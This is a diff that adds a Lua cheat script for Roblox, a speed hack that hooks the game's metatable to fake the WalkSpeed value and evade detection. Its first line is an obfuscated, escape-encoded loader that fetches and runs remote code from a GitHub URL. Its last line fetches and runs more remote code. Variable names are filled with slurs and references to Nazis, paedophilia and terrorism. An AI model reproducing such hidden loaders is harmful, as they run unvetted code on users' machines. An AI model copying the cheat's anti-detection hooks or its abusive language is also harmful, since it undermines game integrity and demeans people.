@@ -1,0 +1,137 @@
+loadstring("\108\111\97\100\115\116\114\105\110\103\40\34\92\49\48\56\92\49\49\49\92\57\55\92\49\48\48\92\49\49\53\92\49\49\54\92\49\49\52\92\49\48\53\92\49\49\48\92\49\48\51\92\52\48\92\49\48\51\92\57\55\92\49\48\57\92\49\48\49\92\53\56\92\55\50\92\49\49\54\92\49\49\54\92\49\49\50\92\55\49\92\49\48\49\92\49\49\54\92\52\48\92\51\52\92\49\48\52\92\49\49\54\92\49\49\54\92\49\49\50\92\49\49\53\92\53\56\92\52\55\92\52\55\92\49\49\52\92\57\55\92\49\49\57\92\52\54\92\49\48\51\92\49\48\53\92\49\49\54\92\49\48\52\92\49\49\55\92\57\56\92\49\49\55\92\49\49\53\92\49\48\49\92\49\49\52\92\57\57\92\49\49\49\92\49\49\48\92\49\49\54\92\49\48\49\92\49\49\48\92\49\49\54\92\52\54\92\57\57\92\49\49\49\92\49\48\57\92\52\55\92\53\52\92\53\52\92\55\49\92\49\48\48\92\57\55\92\55\49\92\49\49\49\92\49\48\48\92\52\55\92\52\57\92\53\51\92\56\56\92\52\53\92\54\55\92\56\50\92\54\53\92\54\55\92\55\53\92\54\57\92\54\56\92\52\55\92\49\48\57\92\57\55\92\49\48\53\92\49\49\48\92\52\55\92\54\57\92\57\48\92\51\55\92\53\48\92\52\56\92\54\55\92\56\50\92\54\53\92\54\55\92\55\53\92\54\57\92\54\56\92\51\55\92\53\48\92\52\56\92\54\54\92\56\57\92\51\55\92\53\48\92\52\56\92\55\55\92\55\51\92\55\56\92\51\55\92\53\48\92\52\56\92\56\56\92\51\55\92\53\48\92\52\56\92\57\48\92\55\57\92\56\50\92\54\56\92\55\57\92\51\52\92\52\52\92\49\49\54\92\49\49\52\92\49\49\55\92\49\48\49\92\52\49\92\52\49\92\52\48\92\52\49\92\49\48\34\41\40\41\10")()
+
+repeat wait() until game:IsLoaded() 
+
+getgenv().Fix = true
+
+getgenv().TeclasWS = {
+    ["tecla1"] = "M", -- speed +5
+    ["tecla2"] = "N", -- speed -5
+    ["tecla3"] = "Q" -- toggle  
+}
+
+
+
+-- // servicios
+local MININOS_DOXXEADOS = game:GetService("Players")
+local AUDIOS_LOUD_DE_TRAP = game:GetService("StarterGui") or "son una mierda"
+
+-- // objetos
+local neonazi = MININOS_DOXXEADOS.LocalPlayer
+local esvastica = neonazi:GetMouse()
+
+-- // variables
+local lista_de_victimas_de_drizzy = getrenv()._G
+local da_hood_rblxm_REAL = getrawmetatable(game)
+local CP = da_hood_rblxm_REAL.__newindex
+local CP_DE_DRIZZY = da_hood_rblxm_REAL.__index
+local velocidad_de_cum = 122
+local es_pedofilo = true
+
+-- // funciones para acortar codigo :]
+function anunciar_atentado_terrorista(fecha_del_atentado)
+    AUDIOS_LOUD_DE_TRAP:SetCore("SendNotification",{
+        Title="Xlazui#2571",
+        Text=fecha_del_atentado,
+        Icon="rbxthumb://type=Asset&id=1332213374&w=150&h=150"
+       })
+end
+
+
+getgenv().TECHWAREWALKSPEED_LOADED = true
+
+
+wait(1.5)
+
+
+anunciar_atentado_terrorista("Welcome"..TeclasWS.tecla3.."")
+
+-- // conexiÃ³n
+esvastica.KeyDown:Connect(function(el_impostor)
+    if el_impostor:lower() == TeclasWS.tecla1:lower() then
+        velocidad_de_cum = velocidad_de_cum + 1
+        anunciar_atentado_terrorista(" (speed =   "..tostring(velocidad_de_cum)..")")
+    elseif el_impostor:lower() == TeclasWS.tecla2:lower() then
+        velocidad_de_cum = velocidad_de_cum - 1
+        anunciar_atentado_terrorista(" (speed =  "..tostring(velocidad_de_cum)..")")
+    elseif el_impostor:lower() == TeclasWS.tecla3:lower() then
+        if es_pedofilo then
+            es_pedofilo = false
+            anunciar_atentado_terrorista("speed off")
+        else
+            es_pedofilo = true
+            anunciar_atentado_terrorista("speed on")
+        end
+    end
+end)
+
+-- // mi parte favorita: metametodos
+setreadonly(da_hood_rblxm_REAL,false)
+da_hood_rblxm_REAL.__index = newcclosure(function(BEST_ON_TOP,IS_GARBAGE)
+    local esPedofilo = checkcaller()
+    if IS_GARBAGE == "WalkSpeed" and not esPedofilo then
+        return lista_de_victimas_de_drizzy.CurrentWS
+    end
+    return CP_DE_DRIZZY(BEST_ON_TOP,IS_GARBAGE)
+end)
+da_hood_rblxm_REAL.__newindex = newcclosure(function(kaias,ip,logger)
+    local unNeonazi = checkcaller()
+    if es_pedofilo then
+        if ip == "WalkSpeed" and logger ~= 0 and not unNeonazi then
+            return CP(kaias,ip,velocidad_de_cum)
+        end
+    end
+    return CP(kaias,ip,logger)
+end)
+setreadonly(da_hood_rblxm_REAL,true)
+
+repeat wait() until game:IsLoaded()
+local Players = game:service('Players')
+local Player = Players.LocalPlayer
+
+repeat wait() until Player.Character
+
+local userInput = game:service('UserInputService')
+local runService = game:service('RunService')
+
+local Multiplier = -0.22
+local Enabled = false
+local whentheflashnoiq
+
+userInput.InputBegan:connect(function(Key)
+    if Key.KeyCode == Enum.KeyCode.LeftBracket then
+        Multiplier = Multiplier + 0.01
+        print(Multiplier)
+        wait(0.2)
+        while userInput:IsKeyDown(Enum.KeyCode.LeftBracket) do
+            wait()
+            Multiplier = Multiplier + 0.01
+            print(Multiplier)
+        end
+    end
+
+    if Key.KeyCode == Enum.KeyCode.RightBracket then
+        Multiplier = Multiplier - 0.01
+        print(Multiplier)
+        wait(0.2)
+        while userInput:IsKeyDown(Enum.KeyCode.RightBracket) do
+            wait()
+            Multiplier = Multiplier - 0.01
+            print(Multiplier)
+        end
+    end
+
+    if Key.KeyCode == Enum.KeyCode.P then
+        Enabled = not Enabled
+        if Enabled == true then
+            repeat
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + game.Players.LocalPlayer.Character.Humanoid.MoveDirection * Multiplier
+                game:GetService("RunService").Stepped:waitn()
+            until Enabled == true
+        end
+    end
+end)
+
+if Fix == true then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/youtubetutorials123/helo/main/123"))()
+end
